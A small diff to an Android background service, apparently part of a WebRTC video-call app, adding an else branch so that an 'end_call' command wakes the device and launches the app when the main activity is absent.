@@ -290,6 +290,8 @@ public class BackgroundKeepAliveService extends Service {
                             MainActivity.getInstance().runOnUiThread(() -> {
                                 MainActivity.getInstance().stopAllMediaAndFinish();
                             });
+                        } else {
+                            wakeUpAndLaunch("end_call", caller, cameraChoice);
                         }
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                         if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
